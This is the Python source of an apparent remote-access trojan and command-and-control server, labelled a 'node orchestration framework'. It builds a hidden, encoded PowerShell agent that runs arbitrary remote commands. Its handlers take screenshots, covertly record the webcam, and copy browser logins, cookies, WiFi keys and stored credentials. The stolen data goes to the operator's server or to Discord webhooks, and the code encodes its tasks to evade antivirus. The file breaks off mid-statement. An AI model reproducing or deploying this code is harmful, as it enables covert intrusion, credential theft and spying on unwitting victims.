#!/usr/bin/env python3
"""
Distributed Node Orchestration Framework — main.py  (v8 — session multiplexing)

PS-template rules (do NOT break these):
  - No backtick-continuation across lines; all Invoke-WebRequest on ONE line.
  - LHOST/LPORT must be read inside each command handler (not at module level)
    so the correct values are used after the user enters them at startup.
  - PATH_SEP is injected by the AGENT exactly once per response.
"""

import os, sys, time, base64, socket, threading, shutil
from dataclasses import dataclass
from typing import Optional
import uvicorn
from fastapi import FastAPI, UploadFile, File, Request, Response

app = FastAPI()

# ── Session data model ────────────────────────────────────────────────────────
@dataclass
class Session:
    session_id:   str
    ip:           str
    hostname:     str
    username:     str
    cwd:          str
    created_at:   str
    status:       str = "Running"   # "Running" | "Stopped"
    current_task: str = ""
    task_result:  Optional[str] = None


class SessionManager:
    def __init__(self):
        self._lock    = threading.Lock()
        self._store:  dict[str, Session] = {}
        self._count   = 0

    def _next_id(self) -> str:
        self._count += 1
        return f"SES-{self._count:03d}"

    def register(self, ip: str, hostname: str, username: str, cwd: str) -> Session:
        """Create a new session, or refresh an existing one matched by hostname+username.
        Using hostname+username (not IP) avoids collisions when multiple machines
        share the same public IP behind NAT."""
        with self._lock:
            existing = next(
                (s for s in self._store.values()
                 if s.hostname == hostname and s.username == username),
                None
            )
            if existing:
                existing.ip     = ip   # update IP in case it changed
                existing.cwd    = cwd
                existing.status = "Running"
                return existing
            sid = self._next_id()
            ts  = time.strftime("%Y-%m-%d %H:%M:%S")
            s   = Session(session_id=sid, ip=ip, hostname=hostname,
                          username=username, cwd=cwd, created_at=ts)
            self._store[sid] = s
            return s

    def get(self, sid: str) -> Optional[Session]:
        with self._lock:
            return self._store.get(sid)

    def get_by_hostname(self, hostname: str) -> Optional[Session]:
        """Fallback lookup by hostname (used when X-Session-ID header is absent)."""
        with self._lock:
            return next(
                (s for s in self._store.values()
                 if s.hostname == hostname and s.status == "Running"),
                None
            )

    def stop(self, sid: str) -> bool:
        with self._lock:
            s = self._store.get(sid)
            if s:
                s.status       = "Stopped"
                s.current_task = ""
                s.task_result  = None
                return True
            return False

    def list_all(self) -> list:
        with self._lock:
            return sorted(self._store.values(), key=lambda s: s.session_id)


# ── Global state ──────────────────────────────────────────────────────────────
SM:                SessionManager  = SessionManager()
ACTIVE_SESSION_ID: Optional[str]  = None
LHOST                             = "0.0.0.0"
LPORT                             = 8080
PATH_SEP                          = "---PATH_SEP---"
_uvicorn_server                   = None
_listener_thread: Optional[threading.Thread] = None   # stored so we can join() on shutdown


# ── Reusable PS function strings (no backticks, no dynamic values) ────────────

# Discord multipart uploader — call as: _DU '<webhook_url>' '<file_path>'
_DISCORD_UPLOAD = (
    "function _DU($whu,$file){"
    "$zb=[System.IO.File]::ReadAllBytes($file);"
    "$bn=[System.Guid]::NewGuid().ToString('N');"
    "$CR=[char]13+[char]10;"
    "$eu=[System.Text.Encoding]::UTF8;"
    "$tn=[System.IO.Path]::GetFileName($file);"
    "$mg='{\"content\":\"Dump from '+$env:COMPUTERNAME+'\"}';"
    "$pl=[System.Collections.Generic.List[byte[]]]::new();"
    "$pl.Add($eu.GetBytes('--'+$bn+$CR+'Content-Disposition: form-data; name=\"payload_json\"'+$CR+'Content-Type: application/json'+$CR+$CR+$mg+$CR));"
    "$pl.Add($eu.GetBytes('--'+$bn+$CR+'Content-Disposition: form-data; name=\"file\"; filename=\"'+$tn+'\"'+$CR+'Content-Type: application/octet-stream'+$CR+$CR));"
    "$pl.Add($zb);$pl.Add($eu.GetBytes($CR+'--'+$bn+'--'+$CR));"
    "$tot=0;foreach($p in $pl){$tot+=$p.Length};"
    "$body=New-Object byte[] $tot;$pos=0;"
    "foreach($p in $pl){[System.Buffer]::BlockCopy($p,0,$body,$pos,$p.Length);$pos+=$p.Length};"
    "$wc=New-Object System.Net.WebClient;"
    "$wc.Headers.Add('Content-Type','multipart/form-data; boundary='+$bn);"
    "try{$wc.UploadData($whu,'POST',$body)|Out-Null}finally{$wc.Dispose()}"
    "};"
)

# Discord chunked text sender — call as: _DS '<webhook_url>' $msg
_DISCORD_TEXT = (
    "function _DS($whu,$msg){"
    "$cs=1900;$i=0;"
    "$wc=New-Object System.Net.WebClient;"
    "$wc.Headers.Add('Content-Type','application/json; charset=utf-8');"
    "$wc.Encoding=[System.Text.Encoding]::UTF8;"
    "while($i -lt $msg.Length){"
    "$chunk=$msg.Substring($i,[Math]::Min($cs,$msg.Length-$i));"
    "$pl=ConvertTo-Json @{content=$chunk} -Compress;"
    "$wc.UploadString($whu,'POST',$pl);$i+=$cs;"
    "if($i -lt $msg.Length){Start-Sleep -Milliseconds 800}"
    "};$wc.Dispose()};"
)

# Livecam child-process script (STA WinForms + avicap32).
_LC_SRC = (
    "param([string]$avi,[string]$flag)\n"
    "Add-Type -AssemblyName System.Windows.Forms\n"
    "Add-Type -TypeDefinition @'\n"
    "using System;using System.Runtime.InteropServices;using System.Windows.Forms;\n"
    "public class CamF:Form{\n"
    "[DllImport(\"avicap32.dll\")]public static extern IntPtr capCreateCaptureWindowA(string n,int s,int x,int y,int w,int h,IntPtr p,int id);\n"
    "[DllImport(\"user32.dll\")]public static extern IntPtr SendMessage(IntPtr h,uint m,IntPtr w,IntPtr l);\n"
    "[DllImport(\"user32.dll\",EntryPoint=\"SendMessageA\",CharSet=CharSet.Ansi)]public static extern IntPtr SendMessageS(IntPtr h,uint m,IntPtr w,string l);\n"
    "[DllImport(\"user32.dll\")]public static extern bool DestroyWindow(IntPtr h);\n"
    "const uint CC=0x040A;const uint CD=0x040B;const uint CF=0x0414;const uint CS=0x043E;const uint CX=0x0444;\n"
    "public string Avi,Flag;IntPtr cap;\n"
    "protected override void OnLoad(EventArgs e){\n"
    "base.OnLoad(e);Opacity=0;ShowInTaskbar=false;\n"
    "cap=capCreateCaptureWindowA(\"c\",0x40000000,-640,-480,320,240,Handle,0);\n"
    "if(cap==IntPtr.Zero){Close();return;}\n"
    "SendMessage(cap,CC,(IntPtr)0,IntPtr.Zero);\n"
    "SendMessageS(cap,CF,IntPtr.Zero,Avi);\n"
    "SendMessage(cap,CS,IntPtr.Zero,IntPtr.Zero);\n"
    "var t=new System.Windows.Forms.Timer();t.Interval=500;\n"
    "t.Tick+=(s2,e2)=>{\n"
    "if(System.IO.File.Exists(Flag)){\n"
    "t.Stop();\n"
    "SendMessage(cap,CX,IntPtr.Zero,IntPtr.Zero);\n"
    "System.Threading.Thread.Sleep(3000);\n"
    "SendMessage(cap,CD,IntPtr.Zero,IntPtr.Zero);\n"
    "System.Threading.Thread.Sleep(500);\n"
    "DestroyWindow(cap);\n"
    "Close();\n"
    "}};t.Start();}\n"
    "}\n"
    "'@ -ReferencedAssemblies 'System.Windows.Forms'\n"
    "$f=New-Object CamF;$f.Avi=$avi;$f.Flag=$flag\n"
    "[System.Windows.Forms.Application]::Run($f)\n"
)
_LC_B64 = base64.b64encode(_LC_SRC.encode('utf-16-le')).decode()

# Webcam single-frame capture child script (STA + avicap32 + SendMessage)
_PIC_SRC = (
    "param([string]$bmp,[string]$done)\n"
    "Add-Type -AssemblyName System.Windows.Forms\n"
    "Add-Type -TypeDefinition @'\n"
    "using System;using System.Runtime.InteropServices;using System.Windows.Forms;\n"
    "public class PicCap:Form{\n"
    "[DllImport(\"avicap32.dll\")]public static extern IntPtr capCreateCaptureWindowA(string n,int s,int x,int y,int w,int h,IntPtr p,int id);\n"
    "[DllImport(\"user32.dll\")]public static extern IntPtr SendMessage(IntPtr h,uint m,IntPtr w,IntPtr l);\n"
    "[DllImport(\"user32.dll\",EntryPoint=\"SendMessageA\",CharSet=CharSet.Ansi)]public static extern IntPtr SendMessageS(IntPtr h,uint m,IntPtr w,string l);\n"
    "[DllImport(\"user32.dll\")]public static extern bool DestroyWindow(IntPtr h);\n"
    "const uint CC=0x040A;const uint CD=0x040B;const uint GF=0x043C;const uint SD=0x0419;\n"
    "public string Bmp,Done;IntPtr cap;\n"
    "protected override void OnLoad(EventArgs e){\n"
    "base.OnLoad(e);Opacity=0;ShowInTaskbar=false;\n"
    "cap=capCreateCaptureWindowA(\"p\",0x40000000,-640,-480,320,240,Handle,0);\n"
    "if(cap==IntPtr.Zero){System.IO.File.WriteAllText(Done,\"err\");Close();return;}\n"
    "SendMessage(cap,CC,(IntPtr)0,IntPtr.Zero);\n"
    "System.Threading.Thread.Sleep(2000);\n"
    "SendMessage(cap,GF,IntPtr.Zero,IntPtr.Zero);\n"
    "System.Threading.Thread.Sleep(500);\n"
    "SendMessage(cap,GF,IntPtr.Zero,IntPtr.Zero);\n"
    "System.Threading.Thread.Sleep(500);\n"
    "SendMessageS(cap,SD,IntPtr.Zero,Bmp);\n"
    "System.Threading.Thread.Sleep(500);\n"
    "SendMessage(cap,CD,IntPtr.Zero,IntPtr.Zero);\n"
    "DestroyWindow(cap);\n"
    "System.IO.File.WriteAllText(Done,\"ok\");\n"
    "Close();}\n"
    "}\n"
    "'@ -ReferencedAssemblies 'System.Windows.Forms'\n"
    "$f=New-Object PicCap;$f.Bmp=$bmp;$f.Done=$done\n"
    "[System.Windows.Forms.Application]::Run($f)\n"
)
_PIC_B64 = base64.b64encode(_PIC_SRC.encode('utf-16-le')).decode()


# ── Payload generator ─────────────────────────────────────────────────────────
def generate_ps_payload(ip: str, port: int) -> str:
    """
    Compact single-string PS agent — no backtick line-continuation.
    Now captures X-Session-ID from the check-in response and sends it
    on all subsequent requests so the server can route tasks correctly.
    Falls back to IP-based routing if header is absent (old-server compat).
    """
    ps = (
        f"$currentPath=$PWD.Path;"
        f"$info=\"$env:COMPUTERNAME|\"+$(whoami).Trim()+\"|$currentPath\";"
        f"$b64=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($info));"
        f"$sid='';"
        f"try{{$cr=Invoke-WebRequest -Uri 'http://{ip}:{port}/checkin' -Method Post -Body $b64 -ContentType 'text/plain' -UseBasicParsing;"
        f"if($cr.Headers['X-Session-ID']){{$sid=$cr.Headers['X-Session-ID']}}}}catch{{}};"
        f"while($true){{"
        f"try{{"
        f"$h=@{{\"X-Agent-CWD\"=$currentPath;\"X-Session-ID\"=$sid}};"
        f"$r=Invoke-WebRequest -Uri 'http://{ip}:{port}/get_task' -Headers $h -UseBasicParsing;"
        f"$cmd=$r.Content.Trim();"
        f"if($cmd){{"
        f"$out=\"\";"
        f"if($cmd -match '^cd(\\s|$)'){{"
        f"$tgt=($cmd -replace '^cd\\s*','').Trim();"
        f"if($tgt -eq '' -or $tgt -eq '~'){{$tgt=$HOME}}"
        f"elseif(-not [System.IO.Path]::IsPathRooted($tgt)){{$tgt=Join-Path $currentPath $tgt}};"
        f"$tgt=$tgt.Replace('/','\\\\');"
        f"try{{Set-Location -LiteralPath $tgt;$currentPath=(Get-Location).Path;$out=\"[+] $currentPath\"}}catch{{$out=\"[-] cd failed: $_\"}}"
        f"}}else{{"
        f"Set-Location $currentPath;"
        f"try{{$out=Invoke-Expression $cmd 2>&1|Out-String;if(-not $out.Trim()){{$out='(no output)'}}}}catch{{$out=\"ERROR: $_\"}};"
        f"$currentPath=(Get-Location).Path"
        f"}};"
        f"$b64r=[Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($out+'{PATH_SEP}'+$currentPath));"
        f"$sh=@{{\"X-Session-ID\"=$sid}};"
        f"Invoke-WebRequest -Uri 'http://{ip}:{port}/submit_result' -Method Post -Body $b64r -ContentType 'text/plain' -Headers $sh -UseBasicParsing|Out-Null"
        f"}}}}catch{{}};"
        f"Start-Sleep -Seconds 3"
        f"}}"
    )
    enc = base64.b64encode(ps.encode('utf-16le')).decode()
    return f"powershell.exe -NoP -NonI -W Hidden -ExecutionPolicy Bypass -Enc {enc}"


# ── Helpers ───────────────────────────────────────────────────────────────────
def parse_agent_response(raw: str):
    if PATH_SEP in raw:
        idx = raw.index(PATH_SEP)
        out = raw[:idx].strip()
        rem = raw[idx + len(PATH_SEP):].strip()
        cwd = next((l.strip() for l in rem.splitlines() if l.strip()), None)
        return out, cwd
    return raw.strip(), None


def _active_session() -> Optional[Session]:
    """Return the currently active Session object, or None."""
    if ACTIVE_SESSION_ID is None:
        return None
    return SM.get(ACTIVE_SESSION_ID)


def wait_for_result(session: Session, timeout: float = 120.0) -> str:
    dl = time.time() + timeout
    while session.task_result is None:
        if time.time() > dl:
            return "[!] Timeout — no agent response."
        if session.status == "Stopped":
            return "[!] Session was stopped."
        time.sleep(0.3)
    r = session.task_result or "(no output)"
    session.task_result = None
    return r


def _send(ps: str, timeout: float = 60.0) -> str:
    """Queue a raw PS string to the active session and block until agent replies."""
    s = _active_session()
    if s is None:
        return "[!] No active session."
    s.current_task = ps
    s.task_result  = None
    return wait_for_result(s, timeout)


def _send_encoded(ps: str, timeout: float = 60.0) -> str:
    """Base64-encode ps before queuing so AV string signatures can't match it."""
    s = _active_session()
    if s is None:
        return "[!] No active session."
    b64 = base64.b64encode(ps.encode('utf-16-le')).decode()
    wrapper = (
        f"[System.Text.Encoding]::Unicode.GetString("
        f"[Convert]::FromBase64String('{b64}'))|Invoke-Expression"
    )
    s.current_task = wrapper
    s.task_result  = None
    return wait_for_result(s, timeout)


def _ask_webhook() -> Optional[str]:
    whu = input("[?] Discord webhook URL: ").strip()
    if not whu.startswith("https://discord.com/api/webhooks/"):
        print("[-] Invalid webhook URL.")
        return None
    return whu


def _shutdown():
    """
    Graceful multi-step shutdown:
      1. Send Stop-Process to every Running session (kills agent processes → clears SYN_SENT)
      2. Signal uvicorn to stop accepting new connections
      3. Join the listener thread (waits for the OS to release port 8080)
      4. Force-exit if join times out
    TIME_WAIT entries are kernel-owned and clear automatically in ~60 s;
    SO_REUSEADDR (already set) lets the next run re-bind immediately anyway.
    """
    global _uvicorn_server, _listener_thread

    # ── Step 1: kill all agent processes so they stop retrying (kills SYN_SENT) ──
    running = [s for s in SM.list_all() if s.status == "Running"]
    if running:
        print(f"[*] Sending kill signal to {len(running)} active session(s)...")
        for s in running:
            try:
                s.current_task = "Stop-Process -Id $PID -Force"
                s.task_result  = None
            except Exception:
                pass
            SM.stop(s.session_id)
        # Give agents ~2 s to receive the kill task before we close the listener
        time.sleep(2.0)

    # ── Step 2: tell uvicorn to exit cleanly ──────────────────────────────────
    if _uvicorn_server:
        _uvicorn_server.should_exit = True

    # ── Step 3: wait for the listener thread to finish closing the socket ─────
    if _listener_thread and _listener_thread.is_alive():
        _listener_thread.join(timeout=6.0)   # uvicorn usually exits in <2 s
        if _listener_thread.is_alive():
            # Force-exit path: thread is stuck, hammer it
            if _uvicorn_server:
                _uvicorn_server.force_exit = True
            _listener_thread.join(timeout=2.0)


# ── FastAPI routes ────────────────────────────────────────────────────────────
@app.post("/checkin")
async def checkin(request: Request):
    body = await request.body()
    try:
        dec   = base64.b64decode(body).decode('utf-8', errors='ignore').strip()
        parts = dec.split("|")
        if len(parts) >= 3:
            hostname = parts[0].strip()
            username = parts[1].strip()
            cwd      = parts[2].strip()
        else:
            hostname = request.client.host
            username = "unknown"
            cwd      = "C:\\"
        ip  = request.client.host
        s   = SM.register(ip, hostname, username, cwd)
        sys.stdout.write(
            f"\n\n[+] Check-in: {s.session_id} | {hostname} ({username}) @ {ip}\n"
            f"[*] CWD: {cwd}\n\nxploit> "
        )
        sys.stdout.flush()
        headers = {"X-Session-ID": s.session_id}
        return Response(content="ok", media_type="text/plain", headers=headers)
    except Exception as e:
        sys.stdout.write(f"\n[!] checkin error: {e}\n")
        sys.stdout.flush()
        return Response(content="ok", media_type="text/plain")


@app.get("/get_task")
async def get_task(request: Request):
    # Primary: use X-Session-ID header (set by agent after check-in)
    # Fallback: match by hostname sent in X-Agent-Hostname header
    sid = request.headers.get("X-Session-ID", "").strip()
    s   = SM.get(sid) if sid else None
    if s is None:
        hn = request.headers.get("X-Agent-Hostname", "").strip()
        s  = SM.get_by_hostname(hn) if hn else None
    if s is None or s.status == "Stopped":
        return Response(content="", media_type="text/plain")
    assert s is not None  # type narrowing for Pyre2
    cwd = request.headers.get("X-Agent-CWD", "").strip()
    if cwd:
        s.cwd = cwd
    if s.current_task:
        t              = s.current_task
        s.current_task = ""
        return Response(content=t, media_type="text/plain")
    return Response(content="", media_type="text/plain")


@app.post("/submit_result")
async def submit_result(request: Request):
    sid = request.headers.get("X-Session-ID", "").strip()
    s   = SM.get(sid) if sid else None
    if s is None:
        hn = request.headers.get("X-Agent-Hostname", "").strip()
        s  = SM.get_by_hostname(hn) if hn else None
    if s is None:
        return {"status": "ok"}
    body = await request.body()
    try:
        dec  = base64.b64decode(body).decode('utf-8', errors='ignore').strip()
        out, cwd = parse_agent_response(dec)
        s.task_result = out or "(no output)"
        if cwd:
            s.cwd = cwd
    except Exception as e:
        s.task_result = f"[!] Decode error: {e}"
    return {"status": "ok"}


@app.post("/upload")
async def upload_file(file: UploadFile = File(...)):
    for d in ("./exfil", "./recordings", "./images"):
        os.makedirs(d, exist_ok=True)
    name = file.filename
    if name.lower().endswith(".avi"):
        dest = f"./recordings/{name}"
    elif name.lower().startswith("pic_"):
        dest = f"./images/{name}"
    else:
        dest = f"./exfil/{name}"
    try:
        with open(dest, "wb") as f:
            shutil.copyfileobj(file.file, f)
        print(f"\n[!] Received: {name} → {dest}")
    except Exception as e:
        print(f"\n[-] Upload error: {e}")
    finally:
        act = _active_session()
        if act:
            sys.stdout.write(f"PS {act.cwd}> ")
        else:
            sys.stdout.write("xploit> ")
        sys.stdout.flush()
    return {"filename": name}


# ── Listener ──────────────────────────────────────────────────────────────────
def start_listener(host: str, port: int):
    global _uvicorn_server
    import logging
    logging.getLogger("uvicorn").setLevel(logging.CRITICAL)
    logging.getLogger("uvicorn.access").setLevel(logging.CRITICAL)
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        sock.listen(128)
    except OSError as e:
        print(f"\n[!] Cannot bind {host}:{port} — {e}")
        os._exit(1)
    cfg = uvicorn.Config(app, log_level="critical")
    srv = uvicorn.Server(cfg)
    _uvicorn_server = srv
    try:
        srv.run(sockets=[sock])
    finally:
        try:
            sock.close()
        except Exception:
            pass


# ── Session registry helpers ──────────────────────────────────────────────────
def _print_sessions():
    sessions = SM.list_all()
    if not sessions:
        print("  [*] No active sessions yet.")
        return
    C = "\033[38;5;51m"
    M = "\033[38;5;171m"
    P = "\033[38;5;135m"
    G = "\033[38;5;82m"
    R = "\033[38;5;196m"
    W = "\033[1;37m"
    X = "\033[0m"
    print(f"\n{P}  ╔══════════╦══════════════════════════════╦═══════════════════╦═══════════╗")
    print(f"{P}  ║{C} Session  {P}║{C} Host / User                  {P}║{C} IP                {P}║{C} Status    {P}║")
    print(f"{P}  ╠══════════╬══════════════════════════════╬═══════════════════╬═══════════╣")
    for s in sessions:
        col  = G if s.status == "Running" else R
        info = f"{s.hostname} / {s.username}"
        print(
            f"{P}  ║{W} {s.session_id:<8} {P}║{W} {info:<28} {P}║{W} {s.ip:<17} {P}║{col} {s.status:<9} {P}║"
        )
    print(f"{P}  ╚══════════╩══════════════════════════════╩═══════════════════╩═══════════╝{X}\n")


# ── Main ──────────────────────────────────────────────────────────────────────
def main():
    global ACTIVE_SESSION_ID, LHOST, LPORT, _listener_thread

    os.system("")  # Enable ANSI escape sequences on Windows terminals
    C = "\033[38;5;51m"   # Cyan
    P = "\033[38;5;135m"  # Deep Purple
    M = "\033[38;5;171m"  # Magenta
    G = "\033[38;5;82m"   # Green
    R = "\033[38;5;196m"  # Red
    W = "\033[1;37m"      # Bright White
    X = "\033[0m"         # Reset

    print(f"""
{P}                     __   __      _       _ _   
{M}                     \ \ / /     | |     (_) |  
{C}                      \ V / _ __ | | ___  _| |_ 
{P}                       > < | '_ \| |/ _ \| | __|
{M}                      / . \| |_) | | (_) | | |_ 
{C}                     /_/ \_\ .__/|_|\___/|_|\__|
{P}                           | |                  
{M}                           |_|                  

{M}               [{W}made with {R}♥{W} by {C}arxncodes & aashay{M}]

{C}    ╔══════════════════ {W}SESSION COMMANDS{C} ════════════════════╗
{M}    ║  {W}list-sessions                connect <session_id>  {M}║
{C}    ║  {W}session-exit                 session-stop <id>     {C}║
{P}    ╠══════════════════ {W}AGENT COMMANDS{P} ══════════════════════╣
{M}    ║  {W}screenshot  pic  harvest-browsers   download        {M}║
{C}    ║  {W}dump / dump-all  dump-os  dump-wifi  dump-credman   {C}║
{M}    ║  {W}key-capture      exit-capture       kill-agent      {M}║
{C}    ║  {W}livecam-start    livecam-stop       livecam-save    {C}║
{P}    ╚════════════════════════════════════════════════════════╝{X}
    """)

    h = input(f"{P}[{C}?{P}] {W}LHOST [{C}0.0.0.0{W}]: {X}").strip()
    LHOST = h if h else "0.0.0.0"
    p = input(f"{P}[{C}?{P}] {W}LPORT [{C}8080{W}]: {X}").strip()
    LPORT = int(p) if p else 8080

    payload = generate_ps_payload(LHOST, LPORT)
    print(f"\n{P}[{G}+{P}] {W}Payload ({M}http://{LHOST}:{LPORT}{W}):\n{C}{payload}{X}\n")
    print(f"{P}[{M}*{P}] {W}Listener starting — waiting for agent check-ins ...{X}\n")

    _listener_thread = threading.Thread(target=start_listener, args=(LHOST, LPORT), daemon=True)
    _listener_thread.start()
    time.sleep(0.8)

    try:
        while True:
            # ── Registry mode prompt ───────────────────────────────────────
            if ACTIVE_SESSION_ID is None:
                try:
                    cmd = input(f"\n{M}xploit{C}>{X} ").strip()
                except EOFError:
                    break
                if not cmd:
                    continue
                c = cmd.lower()

                # exit / quit
                if c in ("exit", "quit"):
                    print("[*] Exiting.")
                    break

                # list-sessions
                if c == "list-sessions":
                    _print_sessions()
                    continue

                # connect <session_id>
                if c.startswith("connect "):
                    sid = cmd.split(" ", 1)[1].strip().upper()
                    s   = SM.get(sid)
                    if s is None:
                        print(f"[-] Session '{sid}' not found. Use list-sessions.")
                    elif s.status == "Stopped":
                        print(f"[-] Session '{sid}' is stopped.")
                    else:
                        ACTIVE_SESSION_ID = sid
                        print(f"[+] Connected to {sid} ({s.hostname} / {s.username})")
                    continue

                # session-stop <session_id>
                if c.startswith("session-stop "):
                    sid = cmd.split(" ", 1)[1].strip().upper()
                    s   = SM.get(sid)
                    if s is None:
                        print(f"[-] Session '{sid}' not found.")
                    elif s.status == "Stopped":
                        print(f"[*] Session '{sid}' already stopped.")
                    else:
                        # Tell the agent to kill itself
                        prev = ACTIVE_SESSION_ID
                        ACTIVE_SESSION_ID = sid
                        _send("Stop-Process -Id $PID -Force", timeout=5.0)
                        ACTIVE_SESSION_ID = prev
                        SM.stop(sid)
                        print(f"[+] Session {sid} stopped.")
                    continue

                print(f"[-] Unknown command. Type list-sessions or connect <id>.")
                continue

            # ── Session mode prompt ────────────────────────────────────────
            s = SM.get(ACTIVE_SESSION_ID)
            if s is None or s.status == "Stopped":
                print(f"\n[!] Session {ACTIVE_SESSION_ID} is no longer active.")
                ACTIVE_SESSION_ID = None
                continue

            try:
                cmd = input(f"\n{M}PS {C}{s.cwd}{W}> {X}").strip()
            except EOFError:
                break

            if not cmd:
                continue

            c = cmd.lower()

            # exit / quit (global)
            if c in ("exit", "quit"):
                print("[*] Exiting.")
                break

            # session-exit — return to registry
            if c == "session-exit":
                print(f"[*] Detached from {ACTIVE_SESSION_ID}. Session remains active.")
                ACTIVE_SESSION_ID = None
                continue

            # list-sessions (available in both modes)
            if c == "list-sessions":
                _print_sessions()
                continue

            # kill-agent
            if c == "kill-agent":
                _send("Stop-Process -Id $PID -Force", timeout=5.0)
                SM.stop(ACTIVE_SESSION_ID)
                print("[*] Agent killed.")
                ACTIVE_SESSION_ID = None
                continue

            # screenshot
            if c == "screenshot":
                print("[*] Capturing screen...")
                lh, lp = LHOST, LPORT
                ps = (
                    "$t=\"$env:TEMP\\sc$(Get-Date -Format 'yyyyMMddHHmmss').png\";"
                    "Add-Type -AssemblyName System.Windows.Forms,System.Drawing;"
                    "$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;"
                    "$bmp=New-Object System.Drawing.Bitmap($s.Width,$s.Height);"
                    "$g=[System.Drawing.Graphics]::FromImage($bmp);"
                    "$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);"
                    "$g.Dispose();"
                    "$bmp.Save($t,[System.Drawing.Imaging.ImageFormat]::Png);"
                    "$bmp.Dispose();"
                    f"(New-Object System.Net.WebClient).UploadFile('http://{lh}:{lp}/upload',$t);"
                    "Remove-Item $t -Force;"
                    "Write-Output '[+] Screenshot uploaded.'"
                )
                print(_send(ps))
                continue

            # harvest-browsers
            if c == "harvest-browsers":
                print("[*] Harvesting browser/WiFi/cred data...")
                lh, lp = LHOST, LPORT
                ps = (
                    "$ts=Get-Date -Format 'yyyyMMddHHmmss';"
                    "$d=\"$env:TEMP\\harv_$ts\";"
                    "New-Item -ItemType Directory $d -Force|Out-Null;"
                    "cmdkey /list|Out-File \"$d\\credman.txt\" -Encoding UTF8;"
                    "$w=@();netsh wlan show profiles|Select-String 'All User Profile'|ForEach-Object{"
                    "$n=($_ -split ':',2)[1].Trim();"
                    "$raw=(& cmd /c \"netsh wlan show profile name=`\"$n`\" key=clear\") -join \"`n\";"
                    "$key=if($raw -match 'Key Content\\s+:\\s+(.+)'){$Matches[1].Trim()}else{'(none)'};"
                    "$w+=\"$n - $key\"};" + "\n"
                    "$w|Out-File \"$d\\wifi.txt\" -Encoding UTF8;"
                    "$bd=\"$d\\browsers\";New-Item -ItemType Directory $bd -Force|Out-Null;"
                    "@{Chrome=\"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\";"
                    "Edge=\"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\"}.GetEnumerator()|ForEach-Object{"
                    "if(Test-Path $_.Value){"
                    "$dst=\"$bd\\$($_.Key)\";New-Item -ItemType Directory $dst -Force|Out-Null;"
                    "foreach($f in @('Login Data','Cookies','History','Web Data')){"
                    "$fp=\"$($_.Value)\\$f\";if(Test-Path $fp){Copy-Item $fp \"$dst\\$f\" -Force}}}};"
                    "$zip=\"$env:TEMP\\harv_$ts.zip\";"
                    "Compress-Archive -Path $d -DestinationPath $zip -Force;"
                    f"(New-Object System.Net.WebClient).UploadFile('http://{lh}:{lp}/upload',$zip);"
                    "Remove-Item $d -Recurse -Force -EA 0;Remove-Item $zip -Force -EA 0;"
                    "Write-Output '[+] Harvest zip uploaded → ./exfil/'"
                )
                print(_send(ps, timeout=90.0))
                continue

            # dump (help)
            if c == "dump":
                print("\n  dump sub-commands:")
                print("    dump-all      — full harvest ZIP → Discord webhook")
                print("    dump-os       — OS/hardware info → Discord chat")
                print("    dump-wifi     — WiFi passwords   → Discord chat")
                print("    dump-credman  — Credential Mgr   → Discord chat")
                continue

            # dump-os
            if c == "dump-os":
                whu = _ask_webhook()
                if not whu:
                    continue
                print("[*] Dumping OS info to Discord...")
                ps = (
                    _DISCORD_TEXT +
                    "$osi=Get-WmiObject Win32_OperatingSystem;"
                    "$cpu=(Get-WmiObject Win32_Processor|Select-Object -First 1).Name;"
                    "$ram=[Math]::Round($osi.TotalVisibleMemorySize/1MB,2);"
                    "$dsk=Get-PSDrive C;"
                    "$ips=(Get-NetIPAddress -AddressFamily IPv4|Where-Object{$_.IPAddress -ne '127.0.0.1'}).IPAddress -join ', ';"
                    "$msg='__**OS Dump: '+$env:COMPUTERNAME+'**__'+\"`n\"+'```'+\"`n\";"
                    "$msg+='Host    : '+$env:COMPUTERNAME+\"`n\";"
                    "$msg+='User    : '+$env:USERNAME+' ('+$env:USERDOMAIN+')'+\"`n\";"
                    "$msg+='OS      : '+$osi.Caption+' '+$osi.OSArchitecture+\"`n\";"
                    "$msg+='CPU     : '+$cpu+\"`n\";"
                    "$msg+='RAM     : '+$ram+' GB'+\"`n\";"
                    "$msg+='Disk    : '+[Math]::Round($dsk.Used/1GB,1)+' GB used / '+[Math]::Round($dsk.Free/1GB,1)+' GB free'+\"`n\";"
                    "$msg+='IPs     : '+$ips+\"`n\"+'```';"
                    f"_DS '{whu}' $msg;"
                    "Write-Output '[+] OS info sent to Discord.'"
                )
                print(_send(ps, timeout=30.0))
                continue

            # dump-wifi
            if c == "dump-wifi":
                whu = _ask_webhook()
                if not whu:
                    continue
                print("[*] Dumping WiFi passwords to Discord...")
                ps = (
                    _DISCORD_TEXT +
                    "$prfs=netsh wlan show profiles|Select-String 'All User Profile';"
                    "if(-not $prfs){Write-Output '[-] No WiFi profiles.'}else{"
                    "$msg='__**WiFi Passwords: '+$env:COMPUTERNAME+'**__'+\"`n\";"
                    "$prfs|ForEach-Object{"
                    "$n=($_ -split ':',2)[1].Trim();"
                    "$raw=(& cmd /c (\"netsh wlan show profile name=`\"`\"$n`\"`\" key=clear\")) -join \"`n\";"
                    "$key=if($raw -match 'Key Content\\s+:\\s+(.+)'){$Matches[1].Trim()}else{'(none)'};"
                    "$msg+=\"`n**\"+$n+\"**`nPassword: ``\"+$key+\"``\"+\"`n\"};"
                    f"_DS '{whu}' $msg;"
                    "Write-Output '[+] WiFi data sent to Discord.'}"
                )
                print(_send(ps, timeout=60.0))
                continue

            # dump-credman
            if c == "dump-credman":
                whu = _ask_webhook()
                if not whu:
                    continue
                print("[*] Dumping Credential Manager to Discord...")
                ps = (
                    _DISCORD_TEXT +
                    "$raw=(cmdkey /list) -join \"`n\";"
                    "$msg='__**Credential Manager: '+$env:COMPUTERNAME+'**__'+\"`n\"+'```'+\"`n\"+$raw+\"`n\"+'```';"
                    f"_DS '{whu}' $msg;"
                    "Write-Output '[+] Credential Manager sent to Discord.'"
                )
                print(_send(ps, timeout=30.0))
                continue

            # dump-all
            if c == "dump-all":
                whu = _ask_webhook()
                if not whu:
                    continue
                print("[*] Running full dump (30–90 s) ...")
                ps = (
                    _DISCORD_UPLOAD +
